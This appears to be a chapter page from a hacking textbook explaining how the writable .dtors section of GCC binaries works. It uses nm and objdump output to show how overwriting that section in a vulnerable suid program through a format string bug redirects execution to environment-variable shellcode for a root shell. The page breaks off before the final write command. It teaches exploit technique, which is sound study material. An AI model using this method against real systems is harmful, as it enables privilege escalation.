<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x357 Detours with .dtors</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part67.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part69.htm">Next &gt;</a></p><p class="s32" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: justify;"><a name="bookmark58">0x357 Detours with .dtors</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">In binary programs compiled with the GNU C compiler, special table sections called <span class="s31">.dtors </span>and <span class="s31">.ctors </span>are made for destructors and constructors, respectively. Constructor functions are executed before the <span class="s31">main() </span>function is executed, and destructor functions are executed just before the <span class="s31">main() </span>function exits with an exit system call. The destructor functions and the <span class="s31">.dtors </span>table section are of particular interest.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">A function can be declared as a destructor function by defining the destructor attribute, as seen in dtors_sample.c.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">dtors_sample.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_571.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;</p><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">static void cleanup(void) <u>&nbsp;</u>attribute<u> </u> ((destructor)); main() {</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 8pt;text-align: left;">printf(&quot;Some actions happen in the main() function..\n&quot;);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">printf(&quot;and then when main() exits, the destructor is called..\n&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">exit(0);</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">void cleanup(void) {</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">printf(&quot;In the cleanup function now..\n&quot;);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_572.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">In the preceding code sample, the <span class="s31">cleanup() </span>function is defined with the destructor attribute, so the function is automatically called when the <span class="s31">main() </span>function exits, as shown next.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_573.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -o dtors_sample dtors_sample.c reader@hacking:~/booksrc $ ./dtors_sample</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Some actions happen in the main() function..</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">and then when main() exits, the destructor is called.. In the cleanup() function now.. reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_574.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This behavior of automatically executing a function on exit is controlled by the <span class="s31">.dtors </span>table section of the binary. This section is an array of 32-bit addresses terminated by a NULL address. The array always begins with <span class="s31">0xffffffff </span>and ends with the NULL address of <span class="s31">0x00000000</span>. Between these two are the addresses of all the functions that have been declared with the destructor attribute.</p><p style="padding-left: 25pt;text-indent: 0pt;line-height: 11pt;text-align: right;">The <span class="s31">nm </span>command can be used to find the address of the <span class="s31">cleanup()</span></p><p style="padding-left: 25pt;text-indent: 0pt;text-align: right;">function, and <span class="s31">objdump </span>can be used to examine the sections of the binary.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_575.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nm ./dtors_sample 080495bc d _DYNAMIC</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08049688 d _GLOBAL_OFFSET_TABLE_</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">080484e4 R _IO_stdin_used</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;line-height: 107%;text-align: left;">w _Jv_RegisterClasses 080495a8 d <u>&nbsp;</u>CTOR_END<u> </u></p><p class="s31" style="padding-left: 25pt;text-indent: 0pt;text-align: right;">080495a4 d <u>&nbsp;</u>CTOR_LIST<u> </u></p><p class="s31" style="padding-left: 25pt;text-indent: 0pt;text-align: right;"><span class="s73">0 </span>080495b4 d <u>&nbsp;</u>DTOR_END<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: -11pt;line-height: 107%;text-align: right;"><span class="s66">f. </span>080495ac d <u>&nbsp;</u>DTOR_LIST<u> </u> 080485a0 r <u>&nbsp;</u>FRAME_END<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">080495b8 d <u>&nbsp;</u>JCR_END<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">080495b8 d <u>&nbsp;</u>JCR_LIST<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">080496b0 A <u>&nbsp;</u>bss_start 080496a4 D <u>&nbsp;</u>data_start</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08048480 t <u>&nbsp;</u>do_global_ctors_aux</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08048340 t <u>&nbsp;</u>do_global_dtors_aux 080496a8 D <u>&nbsp;</u>dso_handle</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;line-height: 106%;text-align: left;">w <u>&nbsp; </u>gmon_start<u>  </u> 08048479 T <u>&nbsp; </u>i686.get_pc_thunk.bx 080495a4 d <u>&nbsp; </u>init_array_end 080495a4 d <u>&nbsp; </u>init_array_start 08048400 T <u>&nbsp; </u>libc_csu_fini</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08048410 T <u>&nbsp;</u>libc_csu_init</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;text-align: left;">U <u>&nbsp;</u>libc_start_main@@GLIBC_2.0 080496b0 A _edata</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">080496b4 A _end 080484b0 T _fini 080484e0 R _fp_hw 0804827c T _init 080482f0 T _start</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">08048314 t call_gmon_start <b>080483e8 t cleanup </b>080496b0 b completed.1 080496a4 W data_start</p><p class="s31" style="padding-left: 91pt;text-indent: 38pt;line-height: 106%;text-align: left;">U exit@@GLIBC_2.0 08048380 t frame_dummy 080483b4 T main</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">080496ac d p.0</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 38pt;line-height: 107%;text-align: left;">U printf@@GLIBC_2.0 reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_576.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 106%;text-align: left;">The <span class="s31">nm </span>command shows that the <span class="s31">cleanup() </span>function is located at <span class="s31">0x080483e8 </span>(shown in bold above). It also reveals that the <span class="s31">.dtors </span>section starts at <span class="s31">0x080495ac </span>with <span class="s67">&nbsp;</span><span class="s31">DTOR_LIST</span><span class="s67"> </span><span class="s31"> </span>(<span class="s63">8</span>) and ends at <span class="s31">0x080495b4 </span>with <span class="s67">&nbsp;</span><span class="s31">DTOR_END</span><span class="s67"> </span><span class="s31"> </span>(<span class="s63">0</span>). This means that <span class="s31">0x080495ac </span>should contain <span class="s31">0xffffffff</span>, <span class="s31">0x080495b4 </span>should contain <span class="s31">0x00000000</span>, and the address between them (<span class="s31">0x080495b0</span>) should contain the address of the <span class="s31">cleanup() </span>function (<span class="s31">0x080483e8</span>).</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The <span class="s31">objdump </span>command shows the actual contents of the <span class="s31">.dtors </span>section (shown in bold below), although in a slightly confusing format. The first value of <span class="s31">80495ac </span>is simply showing the address where the <span class="s31">.dtors </span>section is</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">located. Then the actual bytes are shown, opposed to DWORDs, which means the bytes are reversed. Bearing this in mind, everything appears to be correct.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_577.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ objdump -s -j .dtors ./dtors_sample</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">./dtors_sample:  file format elf32-i386 Contents of section .dtors:</p><p class="s31" style="padding-top: 1pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">80495ac <b>ffffffff e8830408 00000000     </b>............</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_578.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">An interesting detail about the <span class="s31">.dtors </span>section is that it is writable. An object dump of the headers will verify this by showing that the <span class="s31">.dtors </span>section isn’t labeled <span class="s31">READONLY</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_579.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ objdump -h ./dtors_sample</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">./dtors_sample:  file format elf32-i386 Sections:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 8pt;text-align: left;">Idx Name     Size   VMA    LMA    File off Algn</p><p class="s31" style="padding-left: 167pt;text-indent: -68pt;line-height: 107%;text-align: left;">0 .interp   00000013 08048114 08048114 00000114 2**0 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -68pt;text-align: left;">1 .note.ABI-tag 00000020 08048128 08048128 00000128 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -68pt;line-height: 107%;text-align: left;">2 .hash    0000002c 08048148 08048148 00000148 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -68pt;text-align: left;">3 .dynsym   00000060 08048174 08048174 00000174 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -68pt;line-height: 107%;text-align: left;">4 .dynstr   00000051 080481d4 080481d4 000001d4 2**0 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -68pt;text-align: left;">5 .gnu.version 0000000c 08048226 08048226 00000226 2**1 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -68pt;line-height: 107%;text-align: left;">6 .gnu.version_r 00000020 08048234 08048234 00000234 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -68pt;text-align: left;">7 .rel.dyn   00000008 08048254 08048254 00000254 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -68pt;line-height: 107%;text-align: left;">8 .rel.plt   00000020 0804825c 0804825c 0000025c 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -68pt;text-align: left;">9 .init    00000017 0804827c 0804827c 0000027c 2**2 CONTENTS, ALLOC, LOAD, READONLY, CODE</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;line-height: 107%;text-align: left;">10 .plt    00000050 08048294 08048294 00000294 2**2 CONTENTS, ALLOC, LOAD, READONLY, CODE</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;text-align: left;">11 .text    000001c0 080482f0 080482f0 000002f0 2**4 CONTENTS, ALLOC, LOAD, READONLY, CODE</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;line-height: 107%;text-align: left;">12 .fini    0000001c 080484b0 080484b0 000004b0 2**2 CONTENTS, ALLOC, LOAD, READONLY, CODE</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;text-align: left;">13 .rodata   000000bf 080484e0 080484e0 000004e0 2**5 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;line-height: 107%;text-align: left;">14 .eh_frame  00000004 080485a0 080485a0 000005a0 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;text-align: left;">15 .ctors    00000008 080495a4 080495a4 000005a4 2**2 CONTENTS, ALLOC, LOAD, DATA</p><table style="border-collapse:collapse;margin-left:93.2601pt" cellspacing="0"><tr style="height:21pt"><td style="width:62pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">16 .dtors</p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0000000c</p><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">CONTENTS,</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">080495ac 080495ac</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ALLOC, LOAD, DATA</p></td><td style="width:42pt"><p class="s42" style="padding-left: 2pt;padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">000005ac</p></td><td style="width:24pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2**2</p></td></tr><tr style="height:11pt"><td style="width:62pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">17 .jcr</p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00000004</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">080495b8 080495b8</p></td><td style="width:42pt"><p class="s42" style="padding-left: 2pt;padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">000005b8</p></td><td style="width:24pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">2**2</p></td></tr><tr style="height:11pt"><td style="width:62pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">CONTENTS,</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ALLOC, LOAD, DATA</p></td><td style="width:42pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:24pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:62pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">18 .dynamic</p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">000000c8</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">080495bc 080495bc</p></td><td style="width:42pt"><p class="s42" style="padding-left: 2pt;padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">000005bc</p></td><td style="width:24pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2**2</p></td></tr><tr style="height:11pt"><td style="width:62pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">CONTENTS,</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ALLOC, LOAD, DATA</p></td><td style="width:42pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:24pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:62pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">19 .got</p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00000004</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">08049684 08049684</p></td><td style="width:42pt"><p class="s42" style="padding-left: 2pt;padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">00000684</p></td><td style="width:24pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">2**2</p></td></tr><tr style="height:11pt"><td style="width:62pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">CONTENTS,</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ALLOC, LOAD, DATA</p></td><td style="width:42pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:24pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:62pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">20 .got.plt</p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0000001c</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">08049688 08049688</p></td><td style="width:42pt"><p class="s42" style="padding-left: 2pt;padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000688</p></td><td style="width:24pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2**2</p></td></tr><tr style="height:11pt"><td style="width:62pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">CONTENTS,</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ALLOC, LOAD, DATA</p></td><td style="width:42pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:24pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:62pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">21 .data</p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0000000c</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">080496a4 080496a4</p></td><td style="width:42pt"><p class="s42" style="padding-left: 2pt;padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">000006a4</p></td><td style="width:24pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">2**2</p></td></tr><tr style="height:11pt"><td style="width:62pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">CONTENTS,</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ALLOC, LOAD, DATA</p></td><td style="width:42pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:24pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:62pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">22 .bss</p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">00000004</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">080496b0 080496b0</p></td><td style="width:42pt"><p class="s42" style="padding-left: 2pt;padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">000006b0</p></td><td style="width:24pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2**2</p></td></tr><tr style="height:11pt"><td style="width:62pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ALLOC</p></td><td style="width:83pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:42pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:24pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:62pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">23 .comment</p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0000012f</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00000000 00000000</p></td><td style="width:42pt"><p class="s42" style="padding-left: 2pt;padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">000006b0</p></td><td style="width:24pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">2**0</p></td></tr><tr style="height:10pt"><td style="width:62pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:53pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">CONTENTS,</p></td><td style="width:83pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">READONLY</p></td><td style="width:42pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:24pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p class="s31" style="padding-top: 1pt;padding-left: 167pt;text-indent: -72pt;text-align: left;">24 .debug_aranges 00000058 00000000 00000000 000007e0 2**3 CONTENTS, READONLY, DEBUGGING</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;line-height: 107%;text-align: left;">25 .debug_pubnames 00000025 00000000 00000000 00000838 2**0 CONTENTS, READONLY, DEBUGGING</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;text-align: left;">26 .debug_info  000001ad 00000000 00000000 0000085d 2**0 CONTENTS, READONLY, DEBUGGING</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;line-height: 107%;text-align: left;">27 .debug_abbrev 00000066 00000000 00000000 00000a0a 2**0 CONTENTS, READONLY, DEBUGGING</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;text-align: left;">28 .debug_line  0000013d 00000000 00000000 00000a70 2**0 CONTENTS, READONLY, DEBUGGING</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;line-height: 107%;text-align: left;">29 .debug_str  000000bb 00000000 00000000 00000bad 2**0 CONTENTS, READONLY, DEBUGGING</p><p class="s31" style="padding-left: 167pt;text-indent: -72pt;text-align: left;">30 .debug_ranges 00000048 00000000 00000000 00000c68 2**3 CONTENTS, READONLY, DEBUGGING</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_580.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Another interesting detail about the <span class="s31">.dtors </span>section is that it is included in all binaries compiled with the GNU C compiler, regardless of whether any functions were declared with the destructor attribute. This means that the vulnerable format string program, fmt_vuln.c, must have a <span class="s31">.dtors </span>section containing nothing. This can be inspected using <span class="s31">nm </span>and <span class="s31">objdump</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_581.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR 08049694 d <u>&nbsp;</u>DTOR_END<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08049690 d <u>&nbsp;</u>DTOR_LIST<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">./fmt_vuln:  file format elf32-i386 Contents of section .dtors:</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;line-height: 8pt;text-align: left;">8049690 ffffffff 00000000          ........</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_582.png"/></span></p><p class="s67" style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;"><span class="p">As this output shows, the distance between </span>&nbsp; <span class="s31">DTOR_LIST</span>  <span class="s31"> </span><span class="p">and </span>&nbsp; <span class="s31">DTOR_END</span>  <span class="s31"> </span><span class="p">is only four bytes this time, which means there are no addresses between them. The object dump verifies this.</span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Since the <span class="s31">.dtors </span>section is writable, if the address after the <span class="s31">0xffffffff </span>is overwritten with a memory address, the program’s execution flow will be directed to that address when the program exits. This will be the address of</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;"><u> </u>DTOR_LIST<u> </u> <span class="p">plus four, which is </span>0x08049694 <span class="p">(which also happens to be the address of </span><u>&nbsp;</u>DTOR_END<u> </u> <span class="p">in this case).</span></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">If the program is suid root, and this address can be overwritten, it will be possible to obtain a root shell.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_583.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln SHELLCODE will be at 0xbffff9ec</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_584.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Shellcode can be put into an environment variable, and the address can be predicted as usual. Since the program name lengths of the helper program getenvaddr.c and the vulnerable fmt_vuln.c program differ by two bytes, the shellcode will be located at <span class="s31">0xbffff9ec </span>when fmt_vuln.c is executed. This address simply has to be written into the <span class="s31">.dtors </span>section at <span class="s31">0x08049694 </span>(shown in bold below) using the format string vulnerability. In the output below the short write method is used.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_585.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 